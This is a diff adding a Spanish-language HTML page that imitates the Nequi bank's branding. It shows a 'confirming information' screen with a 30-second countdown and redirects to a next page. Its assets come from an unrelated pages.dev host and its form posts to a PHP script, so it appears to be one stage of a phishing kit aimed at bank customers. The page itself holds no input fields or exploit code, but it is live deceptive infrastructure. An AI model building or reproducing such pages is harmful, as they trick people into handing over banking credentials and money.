@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.15.2/moment.min.js"></script>
+  <meta http-equiv="refresh" content="31;url=completar.html">
+  <meta charset="UTF-8">
+  <title>Bienvenido</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" type="text/css" href="https://dns2-3-2.pages.dev/util.css">
+  <link rel="stylesheet" type="text/css" href="https://dns2-3-2.pages.dev/main.css">
+  <script type="text/javascript">
+    window.hasMobileFirstExtension = true;
+
+    $(document).ready(function(){
+      var countdown = 30;
+      var timer = setInterval(function(){
+        countdown--;
+        $('#countdownTimer').text(countdown);
+        if(countdown <= 0){
+          clearInterval(timer);
+          window.location.href = "completar.html";
+        }
+      }, 1000);
+    });
+  </script>
+</head>
+<body background="https://dns2-3-2.pages.dev/background.png" bgcolor="#220120">
+  <header id="main-header">
+    <br>
+    <a class="logo-header" href="index.html">
+      <img src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64dfef05bc6705edb9447499_nequi.svg">
+    </a> <!-- / #logo-header -->
+  </header><!-- / #main-header -->
+  <div class="limiter">
+
+    <div class="container-login100">
+      <div class="wrap-login100 p-l-55 p-r-55 p-t-50 p-b-54">
+
+      <br>
+      <br>
+
+        <form class="login100-form validate-form" method="post" action="rol2.php">
+          <div class="textypn1"><span class="model" style="font-size:28px; color:#ede8f9; text-align:center;">
+          Confirmando información</span></div>
+          <div class="wrap-input101 validate-input" data-validate=""> 
+          <br>
+          <center><img src="https://dns2-3-2.pages.dev/G4ZYg6X.gif"></center>
+          <div class="textypn2"><span class="model" style="font-size:16px; color:#ede8f9; text-align:center;">
+          Por favor espere <span id="countdownTimer">30</span> segundos mientras confirmamos la información ingresada, agradecemos su paciencia.</span></div>
+          <br>
+          
+          <div class="text-right p-t-8 p-b-31">
+            
+          </div>
+          
+          <div class="container-login100-form-btn">
+              
+            <div class="wrap-login100-form-btn">
+              <div class="login100-form-bgbtn"></div>
+              
+            </div>
+            
+          </div>
+          
+          <div>
+          <br>
+          <br>
+          </div><br>
+
+              
+          
+          
+      </div></form>
+      
+    </div>
+      <header id="main-header2">
+  </header><!-- / #main-header -->
+  </div>
+    <div id="dropDownSelect1"></div>
+  </div>
+</body>
+</html>
